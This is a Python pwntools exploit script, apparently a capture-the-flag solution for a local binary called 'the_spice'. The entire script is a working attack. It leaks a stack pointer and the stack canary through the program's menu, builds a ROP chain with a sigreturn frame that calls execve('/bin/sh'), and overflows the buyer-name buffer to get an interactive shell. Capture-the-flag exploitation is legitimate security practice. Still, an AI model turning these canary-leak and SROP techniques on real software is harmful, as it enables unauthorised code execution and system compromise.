#!/usr/bin/env python3

from pwn import *

import sys


def numb(i: int):
    return str(i).encode('ascii')


context.arch = 'amd64'
elf = ELF('./the_spice')

io = process("./the_spice")
if "--gdb" in sys.argv:
    gdb.attach(io, """
                continue
               """)

# Leak stack
io.sendlineafter(b"> ", b"4")
io.recvuntil(b"before it explodes, here's what it saw: ")
leak = io.recvline(keepends=False)
stack = int(leak, 16)
print("Leaked stack pointer:", hex(stack))

# Leak the stack canary
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Enter the buyer index: ", b"9")
io.recvuntil(b"Buyer 9: ")
leak1 = io.recvuntil(b", allocated ", drop=True)[:4]
leak2 = io.recvuntil(b" tons of spice", drop=True)
leak2 = int(leak2.decode('ascii'))
leak = p32(leak2) + leak1
canary = u64(leak)
print("Leaked canary:", hex(canary))

# Prepare the sigreturn frame
binsh = stack + 4
syscall = 0x401274  # addr of syscall instruction (in prompt)
frame = SigreturnFrame()
frame.rax = int(constants.SYS_execve)
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall

pop_rbp = 0x4011cd

# Make a ROP chain
offset = 0xd4
payload = b"/bin/sh\x00".ljust(offset, b'A')
#payload = b'A'*offset
payload += p64(canary)
payload += p64(0)  # saved rbp
payload += p64(elf.symbols['spice_amount'])
payload += p64(pop_rbp)
payload += p64(0x0f)  # spice_amount (placed into rax); 0xf is rt_sigreturn()
payload += p64(syscall)
payload += bytes(frame)

# Do the buffer overflow
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Enter the buyer index: ", b"0")
io.sendlineafter(b"How long is the buyer's name? ", numb(10000))
io.sendlineafter(b"Enter the buyer's name: ", payload)

# Exit
io.sendlineafter(b"> ", b"5")

io.interactive()
